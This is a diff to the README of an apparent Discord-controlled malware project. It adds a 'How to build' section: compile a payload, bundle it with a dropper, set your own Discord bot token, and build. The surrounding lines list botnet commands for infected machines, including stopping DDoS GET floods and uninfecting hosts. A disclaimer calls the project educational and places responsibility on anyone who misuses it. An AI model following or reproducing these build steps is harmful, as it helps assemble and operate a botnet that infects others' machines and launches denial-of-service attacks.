@@ -33,5 +33,11 @@ stopddos : Make all infected machines stop sending GET requests.
 uninfect : Uninfect specified machine.
 ```
 
+## How to build
+1. Compile the payload project.
+2. Place the payload application in the dropper folder (next to dropper.csproj).
+3. Open the dropper project and change the token variable to your Discord bot token. Prefix is also customisable.
+4. Build the dropper project.
+
 ## Disclaimer
 This project was made for educational purposes and to test the capabilities of using Discord as a C2 server. If you choose to use this illegally/maliciously, it is your responsibility.
